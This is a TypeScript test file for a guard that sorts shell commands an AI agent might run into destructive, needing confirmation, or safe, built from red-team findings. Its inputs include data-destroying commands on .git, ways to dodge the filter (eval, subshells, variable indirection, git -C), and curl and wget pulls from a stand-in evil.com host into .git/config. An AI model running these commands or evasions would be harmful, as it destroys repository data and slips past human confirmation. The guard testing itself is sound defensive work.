/**
 * Git Guards — Regression Tests
 *
 * TDD: These tests define the DESIRED behavior. The guards must pass all of them.
 * Consolidated from red team findings (Opus 286 tests + Sonnet 227 tests).
 *
 * Three result types:
 * - expectDestructive: always hard-blocked, no confirmation
 * - expectGitWrite: .git write, needs human confirmation
 * - expectSafe: passes through, never blocked
 */

import { describe, test, expect } from "bun:test";
import { isGitUnsafeBash, isGitPath } from "./git-guards.ts";

function expectDestructive(cmd: string, reasonContains?: string) {
	const result = isGitUnsafeBash(cmd);
	expect(result, `expected DESTRUCTIVE for: ${cmd}`).not.toBeNull();
	expect(result!.type).toBe("destructive");
	if (reasonContains) expect(result!.reason).toContain(reasonContains);
}

function expectGitWrite(cmd: string, reasonContains?: string) {
	const result = isGitUnsafeBash(cmd);
	expect(result, `expected GIT_WRITE for: ${cmd}`).not.toBeNull();
	expect(result!.type).toBe("git_write");
	if (reasonContains) expect(result!.reason).toContain(reasonContains);
}

function expectSafe(cmd: string) {
	const result = isGitUnsafeBash(cmd);
	expect(result, `expected SAFE but got ${result?.type}: ${result?.reason} for: ${cmd}`).toBeNull();
}

// ═══════════════════════════════════════════════════════════════
// 1. DESTRUCTIVE GIT COMMANDS — always hard-blocked
// ═══════════════════════════════════════════════════════════════

describe("destructive: git reset --hard", () => {
	test("bare", () => expectDestructive("git reset --hard"));
	test("with HEAD", () => expectDestructive("git reset --hard HEAD"));
	test("with HEAD~1", () => expectDestructive("git reset --hard HEAD~1"));
	test("with HEAD~10", () => expectDestructive("git reset --hard HEAD~10"));
	test("with commit hash", () => expectDestructive("git reset --hard abc123def456"));
	test("with origin/main", () => expectDestructive("git reset --hard origin/main"));
	test("with ORIG_HEAD", () => expectDestructive("git reset --hard ORIG_HEAD"));
	test("with FETCH_HEAD", () => expectDestructive("git reset --hard FETCH_HEAD"));
	test("after cd", () => expectDestructive("cd /repo && git reset --hard"));
	test("extra whitespace", () => expectDestructive("git  reset  --hard"));
	test("with tab", () => expectDestructive("git\treset\t--hard"));
	test("hidden in compound", () => expectDestructive("echo hello && git reset --hard && echo done"));
	test("after fetch", () => expectDestructive("git fetch && git reset --hard origin/main"));
	test("with newline separator", () => expectDestructive("git log\ngit reset --hard"));
	// safe variants
	test("allows --soft", () => expectSafe("git reset --soft HEAD~1"));
	test("allows --mixed", () => expectSafe("git reset --mixed HEAD~1"));
	test("allows unstage", () => expectSafe("git reset HEAD file.ts"));
});

describe("destructive: git checkout -- (discard)", () => {
	test("checkout -- .", () => expectDestructive("git checkout -- ."));
	test("checkout -- *", () => expectDestructive("git checkout -- *"));
	test("checkout -- file", () => expectDestructive("git checkout -- src/file.ts"));
	test("checkout -- '*.ts'", () => expectDestructive("git checkout -- '*.ts'"));
	test("checkout . (bare dot)", () => expectDestructive("git checkout ."));
	test("checkout . trailing spaces", () => expectDestructive("git checkout .  "));
	// safe variants
	test("allows branch name", () => expectSafe("git checkout feature-branch"));
	test("allows -b", () => expectSafe("git checkout -b new-branch"));
	test("allows main", () => expectSafe("git checkout main"));
});

describe("destructive: git clean", () => {
	test("-f", () => expectDestructive("git clean -f"));
	test("-fd", () => expectDestructive("git clean -fd"));
	test("-xfd", () => expectDestructive("git clean -xfd"));
	test("-ffx", () => expectDestructive("git clean -ffx"));
	test("-fx .", () => expectDestructive("git clean -fx ."));
	test("-df", () => expectDestructive("git clean -df"));
	test("in compound", () => expectDestructive("git status; git clean -fd; git status"));
	// safe variants
	test("allows -n dry run", () => expectSafe("git clean -n"));
	test("allows --dry-run", () => expectSafe("git clean --dry-run"));
	test("allows -nd", () => expectSafe("git clean -nd"));
});

describe("destructive: git push --force / -f", () => {
	test("--force", () => expectDestructive("git push --force"));
	test("--force origin main", () => expectDestructive("git push origin main --force"));
	test("--force origin", () => expectDestructive("git push --force origin"));
	test("--force origin main (prefix)", () => expectDestructive("git push --force origin main"));
	test("-f", () => expectDestructive("git push -f"));
	test("-f origin main", () => expectDestructive("git push -f origin main"));
	test("-f origin", () => expectDestructive("git push origin -f"));
	// safe variants
	test("allows --force-with-lease", () => expectSafe("git push --force-with-lease"));
	test("allows --force-with-lease=HEAD", () => expectSafe("git push --force-with-lease=HEAD"));
	test("allows --force-with-lease origin main", () => expectSafe("git push --force-with-lease origin main"));
	test("allows normal push", () => expectSafe("git push"));
	test("allows push origin main", () => expectSafe("git push origin main"));
	test("allows push -u", () => expectSafe("git push -u origin feature-branch"));
	test("allows push --tags", () => expectSafe("git push origin --tags"));
});

describe("destructive: git init", () => {
	test("bare", () => expectDestructive("git init"));
	test("with path", () => expectDestructive("git init ."));
	test("with named path", () => expectDestructive("git init new-project"));
	test("after cd", () => expectDestructive("cd /repo && git init"));
	test("--bare", () => expectDestructive("git init --bare"));
});

// ═══════════════════════════════════════════════════════════════
// 2. .git WRITE OPERATIONS — need confirmation
// ═══════════════════════════════════════════════════════════════

describe("git_write: rm targeting .git", () => {
	test("rm -rf .git/ (with slash)", () => expectGitWrite("rm -rf .git/"));
	test("rm -rf .git (NO slash)", () => expectGitWrite("rm -rf .git"));
	test("rm .git/config", () => expectGitWrite("rm .git/config"));
	test("rm -f .git/index", () => expectGitWrite("rm -f .git/index"));
	test("rm .git/hooks/*", () => expectGitWrite("rm .git/hooks/*"));
	test("rmdir .git (no slash)", () => expectGitWrite("rmdir .git"));
	test("rmdir .git/custom-dir/", () => expectGitWrite("rmdir .git/custom-dir/"));
	test("rm -rf .git / (space trick)", () => expectGitWrite("rm -rf .git /"));
	test("absolute path", () => expectGitWrite("rm -rf /Users/someone/project/.git/config"));
	test("relative traversal", () => expectGitWrite("rm -rf ../../.git/hooks/pre-commit"));
	test("dot-slash prefix", () => expectGitWrite("rm -rf ./.git/"));
	test("with trailing dot", () => expectGitWrite("rm -rf .git/."));
	test("with stderr redirect", () => expectGitWrite("rm -rf .git 2>/dev/null"));
	test("with slash + stderr redirect", () => expectGitWrite("rm -rf .git/ 2>/dev/null"));
});

describe("git_write: mv/cp targeting .git", () => {
	test("mv .git/config .git/config.bak", () => expectGitWrite("mv .git/config .git/config.bak"));
	test("mv .git/hooks/pre-commit /tmp/", () => expectGitWrite("mv .git/hooks/pre-commit /tmp/"));
	test("mv /tmp/hook .git/hooks/pre-commit", () => expectGitWrite("mv /tmp/hook .git/hooks/pre-commit"));
	test("mv .git /tmp/ (no slash)", () => expectGitWrite("mv .git /tmp/"));
	test("mv .git .git.bak", () => expectGitWrite("mv .git .git.bak"));
	test("cp myhook .git/hooks/pre-commit", () => expectGitWrite("cp myhook .git/hooks/pre-commit"));
	test("cp -r hooks/ .git/hooks/", () => expectGitWrite("cp -r hooks/ .git/hooks/"));
});

describe("git_write: chmod/chown targeting .git", () => {
	test("chmod +x .git/hooks/pre-commit", () => expectGitWrite("chmod +x .git/hooks/pre-commit"));
	test("chmod 755 .git/hooks/pre-commit", () => expectGitWrite("chmod 755 .git/hooks/pre-commit"));
	test("chmod 000 .git (no slash)", () => expectGitWrite("chmod 000 .git"));
	test("chown user:group .git/config", () => expectGitWrite("chown user:group .git/config"));
	test("chown -R root .git/", () => expectGitWrite("chown -R root .git/"));
});

describe("git_write: touch/mkdir/ln targeting .git", () => {
	test("touch .git/info/exclude", () => expectGitWrite("touch .git/info/exclude"));
	test("mkdir .git/refs/tags/v2", () => expectGitWrite("mkdir .git/refs/tags/v2"));
	test("mkdir -p .git/custom/dir", () => expectGitWrite("mkdir -p .git/custom/dir"));
	test("ln -s /tmp/hook .git/hooks/pre-commit", () => expectGitWrite("ln -s /tmp/hook .git/hooks/pre-commit"));
	test("ln -sf /dev/null .git (no slash)", () => expectGitWrite("ln -sf /dev/null .git"));
	test("install -m 755 script.sh .git/hooks/post-commit", () => expectGitWrite("install -m 755 script.sh .git/hooks/post-commit"));
});

describe("git_write: tee/dd/truncate/shred targeting .git", () => {
	test("echo | tee .git/config", () => expectGitWrite("echo config | tee .git/config"));
	test("dd if=/dev/zero of=.git/config", () => expectGitWrite("dd if=/dev/zero of=.git/config"));
	test("truncate --size 0 .git/index", () => expectGitWrite("truncate --size 0 .git/index"));
	test("shred .git/config", () => expectGitWrite("shred .git/config"));
	test("shred -u .git/objects/pack/*.pack", () => expectGitWrite("shred -u .git/objects/pack/*.pack"));
});

describe("git_write: sed/patch/rsync/curl/wget targeting .git", () => {
	test("sed -i targeting .git/config", () => expectGitWrite("sed -i 's/a/b/' .git/config"));
	test("sed -i '' macOS targeting .git", () => expectGitWrite("sed -i '' 's/foo/bar/g' .git/config"));
	test("patch .git/config", () => expectGitWrite("patch .git/config < changes.patch"));
	test("rsync --delete to .git/", () => expectGitWrite("rsync --delete empty/ .git/"));
	test("tar xf into .git/", () => expectGitWrite("tar xf evil.tar -C .git/"));
	test("unzip into .git/", () => expectGitWrite("unzip -o evil.zip -d .git/"));
	test("curl -o .git/config", () => expectGitWrite("curl -o .git/config http://evil.com/config"));
	test("wget -O .git/config", () => expectGitWrite("wget -O .git/config http://evil.com/config"));
});

describe("git_write: shell redirects to .git", () => {
	test("echo > .git/config", () => expectGitWrite("echo stuff > .git/config"));
	test("cat > .git/hooks/pre-push", () => expectGitWrite("cat file > .git/hooks/pre-push"));
	test("printf >> .git/config", () => expectGitWrite("printf 'x' >> .git/config"));
	test("absolute redirect", () => expectGitWrite("cat /dev/null > /path/to/repo/.git/config"));
	test("> .git (truncate worktree pointer)", () => expectGitWrite("> .git"));
});

describe("git_write: case insensitive (macOS)", () => {
	test("rm -rf .GIT/", () => expectGitWrite("rm -rf .GIT/"));
	test("rm -rf .Git/", () => expectGitWrite("rm -rf .Git/"));
	test("rm -rf .gIt/", () => expectGitWrite("rm -rf .gIt/"));
	test("rm -rf .GIT (no slash)", () => expectGitWrite("rm -rf .GIT"));
	test("mv .GIT /tmp/", () => expectGitWrite("mv .GIT /tmp/"));
});

describe("git_write: xargs with .git", () => {
	test("echo .git | xargs rm -rf", () => expectGitWrite("echo .git | xargs rm -rf"));
	test("echo .git/ | xargs rm -rf", () => expectGitWrite("echo .git/ | xargs rm -rf"));
	test("find . -name .git | xargs rm -rf", () => expectGitWrite("find . -name .git | xargs rm -rf"));
	test("echo .git/ | xargs -I{} rm -rf {}", () => expectGitWrite("echo .git/ | xargs -I{} rm -rf {}"));
	test("ls -d .git | xargs rm -rf", () => expectGitWrite("ls -d .git | xargs rm -rf"));
});

describe("git_write: find -exec and -delete with .git", () => {
	test("find -name .git -exec rm -rf", () => expectGitWrite("find . -name '.git' -exec rm -rf {} \\;"));
	test("find -name .git -exec rm -rf +", () => expectGitWrite("find . -name '.git' -exec rm -rf {} +"));
	test("find .git -delete", () => expectGitWrite("find .git -delete"));
	test("find .git/ -delete", () => expectGitWrite("find .git/ -delete"));
	test("find .git -type f -exec truncate", () => expectGitWrite("find .git/ -type f -exec truncate -s 0 {} \\;"));
	test("find -path .git/hooks -exec rm", () => expectGitWrite("find . -path '.git/hooks/' -exec rm {} +"));
});

describe("git_write: eval/bash/subshell wrapping", () => {
	test("eval 'rm -rf .git/'", () => expectGitWrite("eval 'rm -rf .git/'"));
	test("bash <<< 'rm -rf .git/'", () => expectGitWrite("bash <<< 'rm -rf .git/'"));
	test("(rm -rf .git/) subshell", () => expectGitWrite("(rm -rf .git/)"));
	test("{ rm -rf .git/; } brace group", () => expectGitWrite("{ rm -rf .git/; }"));
	test("rm -rf .git/ & backgrounded", () => expectGitWrite("rm -rf .git/ &"));
});

describe("git_write: variable indirection", () => {
	test("X=.git; rm -rf $X/config", () => expectGitWrite("X=.git; rm -rf $X/config"));
	test("D=.git; rm -rf $D/", () => expectGitWrite("D=.git; rm -rf $D/"));
	test("GITDIR='.git'; rm -rf $GITDIR", () => expectGitWrite("GITDIR='.git'; rm -rf $GITDIR"));
	test("export X=.git && rm -rf $X/", () => expectGitWrite("export X=.git && rm -rf $X/"));
});

describe("git_write: compound commands with .git writes", () => {
	test("cat + rm", () => expectGitWrite("cat .git/config && rm .git/config"));
	test("safe + rm .git", () => expectGitWrite("echo hello && rm -rf .git"));
	test("many safe then rm .git at end", () => expectGitWrite("git status && git log && rm -rf .git/"));
});

// ═══════════════════════════════════════════════════════════════
// 3. SAFE — regular git operations, NEVER blocked
// ═══════════════════════════════════════════════════════════════

describe("safe: basic git commands", () => {
	test("git status", () => expectSafe("git status"));
	test("git status --short --branch", () => expectSafe("git status --short --branch"));
	test("git log", () => expectSafe("git log --oneline -5"));
	test("git log --all --graph", () => expectSafe("git log --all --graph --decorate"));
	test("git diff", () => expectSafe("git diff HEAD"));
	test("git diff --cached", () => expectSafe("git diff --cached"));
	test("git diff --cached --stat", () => expectSafe("git diff --cached --stat"));
	test("git diff --name-only", () => expectSafe("git diff --name-only HEAD~3"));
	test("git diff HEAD -- src/", () => expectSafe("git diff HEAD -- src/"));
	test("git show", () => expectSafe("git show HEAD"));
	test("git show --stat", () => expectSafe("git show --stat abc1234"));
	test("git show HEAD:src/main.ts", () => expectSafe("git show HEAD:src/main.ts"));
	test("git branch", () => expectSafe("git branch -a"));
	test("git branch -v", () => expectSafe("git branch -v"));
	test("git branch create", () => expectSafe("git branch feature/new-thing"));
	test("git branch -D", () => expectSafe("git branch -D old-branch"));
	test("git merge", () => expectSafe("git merge feature-branch"));
	test("git merge --no-ff", () => expectSafe("git merge --no-ff feature-branch"));
	test("git merge --abort", () => expectSafe("git merge --abort"));
	test("git pull", () => expectSafe("git pull"));
	test("git pull --rebase", () => expectSafe("git pull --rebase"));
	test("git pull origin main", () => expectSafe("git pull origin main"));
	test("git fetch", () => expectSafe("git fetch"));
	test("git fetch origin", () => expectSafe("git fetch origin"));
	test("git fetch --all --prune", () => expectSafe("git fetch --all --prune"));
});

describe("safe: staging and committing", () => {
	test("git add specific file", () => expectSafe("git add src/file.ts"));
	test("git add multiple files", () => expectSafe("git add packages/teams/worktree.ts packages/teams/leader.ts"));
	test("git add -A", () => expectSafe("git add -A"));
	test("git add .", () => expectSafe("git add ."));
	test("git add -p", () => expectSafe("git add -p"));
	test("git commit", () => expectSafe('git commit -m "fix: something"'));
	test("git commit --amend", () => expectSafe('git commit --amend -m "fix: better"'));
	test("git commit --no-verify", () => expectSafe('git commit --no-verify -m "wip"'));
	test("git commit --allow-empty", () => expectSafe("git commit --allow-empty -m 'empty'"));
});

describe("safe: stash operations", () => {
	test("git stash", () => expectSafe("git stash"));
	test("git stash push", () => expectSafe("git stash push -m 'wip'"));
	test("git stash pop", () => expectSafe("git stash pop"));
	test("git stash apply", () => expectSafe("git stash apply"));
	test("git stash list", () => expectSafe("git stash list"));
	test("git stash show", () => expectSafe("git stash show -p stash@{0}"));
	test("git stash drop", () => expectSafe("git stash drop"));
});

describe("safe: branching and switching", () => {
	test("git checkout main", () => expectSafe("git checkout main"));
	test("git checkout -b", () => expectSafe("git checkout -b feature-branch"));
	test("git checkout feature-branch", () => expectSafe("git checkout feature-branch"));
	test("git switch main", () => expectSafe("git switch main"));
	test("git switch -c", () => expectSafe("git switch -c new-branch"));
	test("git switch -", () => expectSafe("git switch -"));
});

describe("safe: rebase/cherry-pick/revert", () => {
	test("git rebase main", () => expectSafe("git rebase main"));
	test("git rebase -i HEAD~3", () => expectSafe("git rebase -i HEAD~3"));
	test("git rebase --continue", () => expectSafe("git rebase --continue"));
	test("git rebase --abort", () => expectSafe("git rebase --abort"));
	test("git cherry-pick", () => expectSafe("git cherry-pick abc1234"));
	test("git cherry-pick --abort", () => expectSafe("git cherry-pick --abort"));
	test("git revert HEAD", () => expectSafe("git revert HEAD"));
});

describe("safe: tags", () => {
	test("git tag v1.0.0", () => expectSafe("git tag v1.0.0"));
	test("git tag -a", () => expectSafe("git tag -a v1.0.0 -m 'release'"));
	test("git tag -l", () => expectSafe("git tag -l 'v*'"));
	test("git tag -d", () => expectSafe("git tag -d v1.0.0"));
});

describe("safe: plumbing and inspection", () => {
	test("git rev-parse HEAD", () => expectSafe("git rev-parse HEAD"));
	test("git rev-parse --show-toplevel", () => expectSafe("git rev-parse --show-toplevel"));
	test("git rev-parse --abbrev-ref HEAD", () => expectSafe("git rev-parse --abbrev-ref HEAD"));
	test("git rev-list --count", () => expectSafe("git rev-list --count HEAD"));
	test("git describe --tags", () => expectSafe("git describe --tags"));
	test("git blame", () => expectSafe("git blame src/main.ts"));
	test("git shortlog -sn", () => expectSafe("git shortlog -sn"));
	test("git reflog", () => expectSafe("git reflog"));
	test("git log --follow", () => expectSafe("git log --follow src/renamed-file.ts"));
	test("git ls-files", () => expectSafe("git ls-files"));
	test("git ls-tree HEAD", () => expectSafe("git ls-tree HEAD"));
	test("git count-objects", () => expectSafe("git count-objects -v"));
	test("git fsck", () => expectSafe("git fsck"));
	test("git gc", () => expectSafe("git gc"));
	test("git notes", () => expectSafe("git notes add -m 'note'"));
	test("git restore --staged", () => expectSafe("git restore --staged file.ts"));
	test("git update-index --add", () => expectSafe("git update-index --add src/file.ts"));
	test("git bisect start/good/bad/reset", () => {
		expectSafe("git bisect start");
		expectSafe("git bisect good");
		expectSafe("git bisect bad");
		expectSafe("git bisect reset");
	});
	test("git archive", () => expectSafe("git archive --format=tar HEAD | tar -x -C /tmp/export"));
	test("git format-patch", () => expectSafe("git format-patch HEAD~3"));
	test("git am", () => expectSafe("git am < patches.mbox"));
	test("git apply", () => expectSafe("git apply patch.diff"));
});

describe("safe: config operations", () => {
	test("git config --list", () => expectSafe("git config --list"));
	test("git config --list --show-origin", () => expectSafe("git config --list --show-origin"));
	test("git config --global user.name", () => expectSafe("git config --global user.name"));
	test("git config user.name 'Alice'", () => expectSafe('git config user.name "Alice"'));
	test("git config user.email", () => expectSafe('git config user.email "alice@example.com"'));
	test("git config --global core.editor", () => expectSafe('git config --global core.editor "code --wait"'));
	test("git config --get", () => expectSafe("git config --get remote.origin.url"));
	test("git config --unset", () => expectSafe("git config --unset some.key"));
});

describe("safe: remotes/worktrees/submodules", () => {
	test("git remote -v", () => expectSafe("git remote -v"));
	test("git remote add origin .git url", () => expectSafe("git remote add origin https://github.com/user/repo.git"));
	test("git remote remove", () => expectSafe("git remote remove upstream"));
	test("git remote set-url", () => expectSafe("git remote set-url origin https://github.com/user/new-repo.git"));
	test("git worktree add", () => expectSafe("git worktree add .worktrees/test -b test"));
	test("git worktree list", () => expectSafe("git worktree list"));
	test("git worktree remove", () => expectSafe("git worktree remove .worktrees/test"));
	test("git submodule init", () => expectSafe("git submodule init"));
	test("git submodule update", () => expectSafe("git submodule update"));
	test("git submodule update --init --recursive", () => expectSafe("git submodule update --init --recursive"));
	test("git submodule add", () => expectSafe("git submodule add https://github.com/user/lib.git"));
	test("git submodule status", () => expectSafe("git submodule status"));
});

describe("safe: clone with .git urls", () => {
	test("git clone https url.git", () => expectSafe("git clone https://github.com/user/repo.git"));
	test("git clone --depth 1", () => expectSafe("git clone --depth 1 https://github.com/user/repo.git"));
	test("git clone --bare", () => expectSafe("git clone --bare https://github.com/user/repo.git"));
	test("git clone ssh", () => expectSafe("git clone git@github.com:user/repo.git"));
	test("git clone into dir", () => expectSafe("git clone https://github.com/user/repo.git my-repo"));
	test("git fetch url.git", () => expectSafe("git fetch https://github.com/user/fork.git main"));
	test("git push gerrit .git", () => expectSafe("git push https://gerrit.example.com/repo.git HEAD:refs/for/main"));
});

describe("safe: soft reset variants", () => {
	test("git reset --soft", () => expectSafe("git reset --soft HEAD~1"));
	test("git reset HEAD file", () => expectSafe("git reset HEAD file.ts"));
	test("git reset --mixed", () => expectSafe("git reset --mixed HEAD~1"));
});

// ═══════════════════════════════════════════════════════════════
// 4. SAFE — read-only .git access
// ═══════════════════════════════════════════════════════════════

describe("safe: read-only .git access", () => {
	test("cat .git/config", () => expectSafe("cat .git/config"));
	test("cat .git/HEAD", () => expectSafe("cat .git/HEAD"));
	test("head -1 .git/HEAD", () => expectSafe("head -1 .git/HEAD"));
	test("tail -5 .git/description", () => expectSafe("tail -5 .git/description"));
	test("less .git/config", () => expectSafe("less .git/config"));
	test("more .git/info/exclude", () => expectSafe("more .git/info/exclude"));
	test("ls .git/", () => expectSafe("ls .git/"));
	test("ls -la .git/hooks/", () => expectSafe("ls -la .git/hooks/"));
	test("ls -R .git/refs/", () => expectSafe("ls -R .git/refs/"));
	test("find .git -name config", () => expectSafe("find .git -name 'config'"));
	test("find .git -type f | wc -l", () => expectSafe("find .git -type f | wc -l"));
	test("grep in .git/config", () => expectSafe("grep 'url' .git/config"));
	test("rg in .git/config", () => expectSafe("rg pattern .git/config"));
	test("wc -l .git/config", () => expectSafe("wc -l .git/config"));
	test("file .git/HEAD", () => expectSafe("file .git/HEAD"));
	test("stat .git/config", () => expectSafe("stat .git/config"));
	test("du -sh .git/", () => expectSafe("du -sh .git/"));
	test("md5sum .git/HEAD", () => expectSafe("md5sum .git/HEAD"));
	test("sha256sum .git/config", () => expectSafe("sha256sum .git/config"));
	test("diff .git/config backup", () => expectSafe("diff .git/config .git/config.bak"));
	test("hexdump .git/HEAD", () => expectSafe("hexdump .git/HEAD"));
	test("od -c .git/HEAD", () => expectSafe("od -c .git/HEAD"));
	test("strings .git/objects/pack/*.idx", () => expectSafe("strings .git/objects/pack/*.idx"));
	test("xxd .git/index | head", () => expectSafe("xxd .git/index | head -20"));
	test("git diff .git/config", () => expectSafe("git diff .git/config"));
});

// ═══════════════════════════════════════════════════════════════
// 5. SAFE — .gitignore, .github, .gitmodules (NOT .git)
// ═══════════════════════════════════════════════════════════════

describe("safe: .gitignore/.github/.gitmodules (not .git)", () => {
	test("cat .gitignore", () => expectSafe("cat .gitignore"));
	test("echo >> .gitignore", () => expectSafe("echo '*.log' >> .gitignore"));
	test("ls .github/workflows/", () => expectSafe("ls .github/workflows/"));
	test("cp .github/workflows/ci.yml", () => expectSafe("cp .github/workflows/ci.yml /tmp/ci.yml"));
	test("cat .gitmodules", () => expectSafe("cat .gitmodules"));
	test("chmod +x .github/scripts/deploy.sh", () => expectSafe("chmod +x .github/scripts/deploy.sh"));
	test("touch .gitattributes", () => expectSafe("touch .gitattributes"));
	test("rm .gitkeep", () => expectSafe("rm .gitkeep"));
	test("rm -rf .github/old-workflow.yml", () => expectSafe("rm -rf .github/old-workflow.yml"));
	test("mv .gitmodules .gitmodules.bak", () => expectSafe("mv .gitmodules .gitmodules.bak"));
	test("grep .gitignore", () => expectSafe("grep -r pattern .gitignore"));
	test("rg excluding .git/", () => expectSafe("rg --glob '!.git/' pattern src/"));
	test("find -not -path .git/*", () => expectSafe("find . -not -path '.git/*' -name '*.ts'"));
});

describe("safe: incidental .git mentions", () => {
	test("echo mentioning .git/", () => expectSafe("echo 'the .git/ folder structure'"));
	test("echo repo.git url", () => expectSafe("echo 'cloned from https://github.com/user/repo.git'"));
	test("rg 'GIT_DIR' in source", () => expectSafe("rg 'GIT_DIR' src/"));
	test("echo $GIT_DIR", () => expectSafe("echo $GIT_DIR"));
	test("echo 'Checking .git/config...'", () => expectSafe("echo 'Checking .git/config...'"));
	test("printf with .git/ in format", () => expectSafe("printf 'looking at .git/config\\n'"));
});

// ═══════════════════════════════════════════════════════════════
// 6. SAFE — build/dev commands
// ═══════════════════════════════════════════════════════════════

describe("safe: build and dev commands", () => {
	test("npm run build", () => expectSafe("npm run build"));
	test("pnpm test", () => expectSafe("pnpm test"));
	test("bun test", () => expectSafe("bun test src/git-guards.test.ts"));
	test("cargo build", () => expectSafe("cargo build --release"));
	test("cargo test", () => expectSafe("cargo test"));
	test("cargo fmt", () => expectSafe("cargo fmt --all"));
	test("make all", () => expectSafe("make all"));
	test("docker build", () => expectSafe("docker build -t app ."));
	test("rsync src/ dest/", () => expectSafe("rsync -av src/ dest/"));
	test("tar czf backup", () => expectSafe("tar czf backup.tar.gz src/"));
	test("curl https://api", () => expectSafe("curl https://api.example.com"));
	test("wget https://example", () => expectSafe("wget https://example.com/file"));
});

// ═══════════════════════════════════════════════════════════════
// 7. SAFE — real-world agent workflows
// ═══════════════════════════════════════════════════════════════

describe("safe: real-world agent workflows", () => {
	test("cargo fmt && git add -A && git diff", () => {
		expectSafe("cargo fmt --all && git add -A && git diff --cached --stat");
	});
	test("git add files && git commit", () => {
		expectSafe("git add src/file.ts packages/foo/bar.ts && git commit -m 'fix: thing'");
	});
	test("git stash && pull && pop", () => {
		expectSafe("git stash && git pull --rebase && git stash pop");
	});
	test("git fetch && rebase", () => {
		expectSafe("git fetch origin && git rebase origin/main");
	});
	test("worktree add && cd && status", () => {
		expectSafe("git worktree add .worktrees/feature -b feature && cd .worktrees/feature && git status");
	});
	test("git log | head", () => expectSafe("git log --oneline -10 | head -5"));
	test("git branch -D", () => expectSafe("git branch -D old-branch"));
	test("git tag && push tag", () => expectSafe("git tag v1.0.0 && git push origin v1.0.0"));
	test("git cherry-pick", () => expectSafe("git cherry-pick abc123"));
	test("git revert HEAD", () => expectSafe("git revert HEAD"));
	test("git merge --no-ff", () => expectSafe("git merge --no-ff feature-branch"));
	test("git am", () => expectSafe("git am < patch.mbox"));
	test("complex pipe", () => expectSafe("git log --format='%H' | head -1 | xargs git show"));
	test("pnpm install + commit", () => expectSafe("pnpm install && git add pnpm-lock.yaml && git commit -m 'chore: lock'"));
	test("git diff | xargs prettier", () => expectSafe("git diff --name-only | xargs prettier --write"));
	test("git stash && checkout && pop", () => expectSafe("git stash && git checkout main && git stash pop"));
	test("format lint add commit", () => expectSafe("prettier --write . && eslint --fix . && git add -A && git commit -m 'chore: fmt'"));
});

// ═══════════════════════════════════════════════════════════════
// 8. isGitPath
// ═══════════════════════════════════════════════════════════════

describe("isGitPath: must return TRUE", () => {
	test(".git/config", () => expect(isGitPath(".git/config")).toBe(true));
	test(".git/HEAD", () => expect(isGitPath(".git/HEAD")).toBe(true));
	test("repo/.git/hooks/pre-commit", () => expect(isGitPath("repo/.git/hooks/pre-commit")).toBe(true));
	test("../../.git/config", () => expect(isGitPath("../../.git/config")).toBe(true));
	test("/home/user/project/.git/config", () => expect(isGitPath("/home/user/project/.git/config")).toBe(true));
	test("Windows .git\\config", () => expect(isGitPath(".git\\config")).toBe(true));
	test("mixed slashes", () => expect(isGitPath("/repo/.git\\config")).toBe(true));
	test("bare .git", () => expect(isGitPath(".git")).toBe(true));
	test("path ending in .git", () => expect(isGitPath("repo/.git")).toBe(true));
	test("deep nested", () => expect(isGitPath("a/b/c/.git/objects/pack")).toBe(true));
	// case insensitive (macOS)
	test(".GIT/config", () => expect(isGitPath(".GIT/config")).toBe(true));
	test(".Git/config", () => expect(isGitPath(".Git/config")).toBe(true));
	test(".gIT/hooks/pre-commit", () => expect(isGitPath(".gIT/hooks/pre-commit")).toBe(true));
});

describe("isGitPath: must return FALSE", () => {
	test(".gitignore", () => expect(isGitPath(".gitignore")).toBe(false));
	test(".github/workflows/ci.yml", () => expect(isGitPath(".github/workflows/ci.yml")).toBe(false));
	test(".gitmodules", () => expect(isGitPath(".gitmodules")).toBe(false));
	test(".gitattributes", () => expect(isGitPath(".gitattributes")).toBe(false));
	test("src/git-utils.ts", () => expect(isGitPath("src/git-utils.ts")).toBe(false));
	test("my-git-helper/config", () => expect(isGitPath("my-git-helper/config")).toBe(false));
	test(".git-temp/config", () => expect(isGitPath(".git-temp/config")).toBe(false));
	test("git/config", () => expect(isGitPath("git/config")).toBe(false));
	test(".gitkeep", () => expect(isGitPath(".gitkeep")).toBe(false));
	test(".github", () => expect(isGitPath(".github")).toBe(false));
	test("mygit/config", () => expect(isGitPath("mygit/config")).toBe(false));
	test("empty string", () => expect(isGitPath("")).toBe(false));
	test("just a dot", () => expect(isGitPath(".")).toBe(false));
	test("slashes only", () => expect(isGitPath("///")).toBe(false));
});

// ═══════════════════════════════════════════════════════════════
// 9. Edge cases
// ═══════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════
// 10. Round 2 red team fixes — git global flags, redirects, etc.
// ═══════════════════════════════════════════════════════════════

describe("destructive: git -C flag (bypasses naive regex)", () => {
	test("git -C . reset --hard", () => expectDestructive("git -C . reset --hard"));
	test("git -C /repo reset --hard", () => expectDestructive("git -C /repo reset --hard"));
	test("git -C /repo reset --hard HEAD~3", () => expectDestructive("git -C /repo reset --hard HEAD~3"));
	test("git -C /repo checkout -- .", () => expectDestructive("git -C /repo checkout -- ."));
	test("git -C /repo checkout -- src/file.ts", () => expectDestructive("git -C /repo checkout -- src/file.ts"));
	test("git -C . checkout .", () => expectDestructive("git -C . checkout ."));
	test("git -C . clean -fd", () => expectDestructive("git -C . clean -fd"));
	test("git -C /repo clean -xfd", () => expectDestructive("git -C /repo clean -xfd"));
	test("git -C /repo push --force", () => expectDestructive("git -C /repo push --force"));
	test("git -C /repo push -f", () => expectDestructive("git -C /repo push -f"));
	test("git -C /path init", () => expectDestructive("git -C /path init"));
	test("cd /repo && git -C . reset --hard", () => expectDestructive("cd /repo && git -C . reset --hard"));
	test("git -C /worktree clean -fd && echo done", () => expectDestructive("git -C /worktree clean -fd && echo done"));
	// safe variants with -C
	test("allows git -C /worktree status", () => expectSafe("git -C /worktree status"));
	test("allows git -C /worktree log --oneline", () => expectSafe("git -C /worktree log --oneline"));
	test("allows git -C /worktree diff", () => expectSafe("git -C /worktree diff"));
	test("allows git -C /worktree add .", () => expectSafe("git -C /worktree add ."));
	test("allows git -C /worktree commit -m fix", () => expectSafe("git -C /worktree commit -m 'fix'"));
	test("allows git -C /worktree fetch", () => expectSafe("git -C /worktree fetch origin"));
});

describe("destructive: git global flags before subcommand", () => {
	test("git --no-pager reset --hard", () => expectDestructive("git --no-pager reset --hard"));
	test("git --no-pager reset --hard HEAD", () => expectDestructive("git --no-pager reset --hard HEAD"));
	test("git --work-tree=/ reset --hard", () => expectDestructive("git --work-tree=/ reset --hard"));
	test("git --work-tree=/tmp clean -fd", () => expectDestructive("git --work-tree=/tmp clean -fd"));
